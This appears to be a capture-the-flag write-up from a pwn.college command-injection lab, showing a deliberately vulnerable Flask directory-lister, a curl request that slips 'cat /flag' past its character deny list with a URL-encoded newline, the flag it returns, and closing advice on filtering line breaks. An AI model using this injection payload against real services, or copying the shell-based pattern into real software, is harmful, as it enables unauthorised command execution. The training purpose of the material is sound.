@@ -1,0 +1,96 @@
+hacker@web-security~cmdi-6:/challenge$ cat server 
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/milestone", methods=["GET"])
+def challenge():
+    arg = (
+        flask.request.args.get("target", "/challenge")
+        .replace(";", "")
+        .replace("&", "")
+        .replace("|", "")
+        .replace(">", "")
+        .replace("<", "")
+        .replace("(", "")
+        .replace(")", "")
+        .replace("`", "")
+        .replace("$", "")
+    )
+    command = f"ls -l {arg}"
+
+    print(f"DEBUG: {command=}")
+    result = subprocess.run(
+        command,  # the command to run
+        shell=True,  # use the shell to run this command
+        stdout=subprocess.PIPE,  # capture the standard output
+        stderr=subprocess.STDOUT,  # 2>&1
+        encoding="latin",  # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/milestone"><input type=text name=target><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of {command}:</b><br>
+        <pre>{result}</pre>
+        </body></html>
+        """
+
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = "challenge.localhost:80"
+app.run("challenge.localhost", 80)
+
+
+hacker@web-security~cmdi-6:/challenge$ curl 'http://challenge.localhost:80/milestone?target=/%0A%20cat%20/flag'
+DEBUG: command='ls -l /\n cat /flag'
+127.0.0.1 - - [19/Oct/2025 19:17:27] "GET /milestone?target=/%0A%20cat%20/flag HTTP/1.1" 200 -
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/milestone"><input type=text name=target><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l /
+ cat /flag:</b><br>
+        <pre>total 64
+lrwxrwxrwx    1 root root    7 Apr  4  2025 bin -> usr/bin
+drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
+drwxr-xr-x    1 root root 4096 Oct 19 18:40 challenge
+drwxr-xr-x    6 root root  380 Oct 19 18:40 dev
+drwxr-xr-x    1 root root 4096 Oct 19 18:40 etc
+-r--------    1 root root   58 Oct 19 18:40 flag
+drwxr-xr-x    1 root root 4096 Sep 26 17:24 home
+lrwxrwxrwx    1 root root    7 Apr  4  2025 lib -> usr/lib
+lrwxrwxrwx    1 root root    9 Apr  4  2025 lib32 -> usr/lib32
+lrwxrwxrwx    1 root root    9 Apr  4  2025 lib64 -> usr/lib64
+lrwxrwxrwx    1 root root   10 Apr  4  2025 libx32 -> usr/libx32
+drwxr-xr-x    2 root root 4096 Apr  4  2025 media
+drwxr-xr-x    2 root root 4096 Apr  4  2025 mnt
+drwxr-xr-x    1 root root   16 Oct 26  2024 nix
+drwxr-xr-x    1 root root 4096 Sep 26 17:24 opt
+dr-xr-xr-x 3313 root root    0 Oct 19 18:40 proc
+drwx------    1 root root 4096 Sep 26 17:24 root
+drwxr-xr-x    1 root root 4096 Oct 19 18:40 run
+lrwxrwxrwx    1 root root    8 Apr  4  2025 sbin -> usr/sbin
+drwxr-xr-x    2 root root 4096 Apr  4  2025 srv
+dr-xr-xr-x   13 root root    0 Aug 26 04:26 sys
+drwxrwxrwt    1 root root 4096 Oct 19 18:40 tmp
+drwxr-xr-x    1 root root 4096 Sep 26 17:09 usr
+drwxr-xr-x    1 root root 4096 Sep 26 17:08 var
+pwn.college{kKBRA8mt-FXurMNmW7cJ6Bj6JNA.dRzN1YDL1AjM5MzW}
+</pre>
+        </body></html>
+A deny list is less secure than an allow list, as it attempts to filter out known bad characters. It is less robust because a bypass for the filter may exist. To filter out new line attacks specifically, you should remove or replace both \n (line feed) and \r (carriage return). 
+Remove line endings: Use a function like str_replace() or a regular expression to eliminate all occurrences of \n and \r. Be aware that Windows uses \r\n, so you must filter for both.
+Handle multiple encodings: Consider that attackers can URL-encode the characters, 
+
+such as %0A for \n and %0D for \r. The filter must be able to handle these encoded variations as well. 
